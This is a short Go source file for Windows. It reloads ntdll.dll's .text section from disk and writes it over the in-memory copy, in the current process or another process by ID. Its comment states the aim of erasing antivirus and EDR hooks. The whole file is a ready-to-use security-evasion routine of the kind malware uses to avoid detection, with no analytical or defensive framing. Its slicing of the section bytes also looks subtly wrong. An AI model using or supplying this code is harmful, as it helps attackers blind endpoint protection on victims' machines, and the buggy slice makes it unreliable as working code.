package main

import (
	"debug/pe"
	"fmt"
	"log"
	"os"

	"golang.org/x/sys/windows"
)

func main() {
	err := RefreshPE(`C:\Windows\System32\ntdll.dll`, -1)
	if err != nil {
		fmt.Println(err)
	}

}

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
// use pid -1 for current process
func RefreshPE(name string, pid int) error {
	log.Printf("Reloading %s...\n", name)
	df, err := os.ReadFile(name)
	if err != nil {
		return err
	}
	f, err := pe.Open(name)
	if err != nil {
		return err
	}

	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, pid, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, pid int, virtualoffset uint32, secname string, vsize uint32) (err error) {
	var pHandle windows.Handle
	t, err := windows.LoadDLL(pn)
	if err != nil {
		return err
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	if pid == -1 {
		pHandle = windows.CurrentProcess()
	} else {
		pHandle, err = windows.OpenProcess(windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION, false, uint32(pid))
		if err != nil {
			return err
		}
	}
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, uintptr(dllOffset), &b[0], uintptr(len(b)), &numberOfBytesWritten)
	if err != nil {
		return err
	}

	log.Println("DLL overwritten")

	return nil
}
